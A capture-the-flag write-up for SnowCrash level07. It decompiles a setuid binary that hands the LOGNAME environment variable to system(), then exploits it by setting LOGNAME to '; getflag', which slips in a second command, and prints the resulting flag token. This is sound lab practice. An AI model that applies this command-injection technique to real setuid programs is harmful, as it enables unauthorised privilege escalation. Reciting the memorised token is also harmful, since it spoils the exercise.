# Flag07

Another executable with the name of my user:
```
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
level07@SnowCrash:~$ pwd
/home/user/level07
level07@SnowCrash:~$
```
that I will transfer to my local session:
```
~ $ scp -P 4242 level07@10.13.250.56:/home/user/level07/level07 ~/
           _____                      _____               _
          / ____|                    / ____|             | |
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.0.2.15
level07@10.13.250.56's password:
level07                                                                               100% 8805     1.7MB/s   00:00

~ $ file level07
level07: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fa7a45263971559b03d34ffabfd13692d0111654, with debug_info, not stripped

~ $ ghidra
```
Here is the `main()` function:
```
/* WARNING: Unknown calling convention */

int main(int argc,char **argv,char **envp)

{
  char *param2;
  int iVar1;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  param2 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",param2);
  iVar1 = system(local_1c);
  return iVar1;
}

```
Same pattern as [before](#Flag03). However, in this case, the program looks for the environment variable "LOGNAME" and prints it on the terminal.

Let's look into it a bit more deeply:

[`asprintf`](https://stackoverflow.com/questions/12746885/why-use-asprintf-instead-of-sprintf) allocates
> a string large enough to hold the output including the terminating null byte, and return\[s] a pointer to it via the first argument.

On the `local_1c` variable is saved the string `"/bin/echo %s "`, to which is added the environment variable received by  the `getenv()` function. The function `system()` is then called to execute the command, the return value of which is returned by the program:
```
level07@SnowCrash:~$ ./level07
level07
level07@SnowCrash:~$ echo $?
0
level07@SnowCrash:~$
```
What I can do is modify the environment variable to make the program "spit" the token:
```
level07@SnowCrash:~$ echo $LOGNAME
level07
level07@SnowCrash:~$ export LOGNAME="; getflag"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$ su level08
Password:
level08@SnowCrash:~$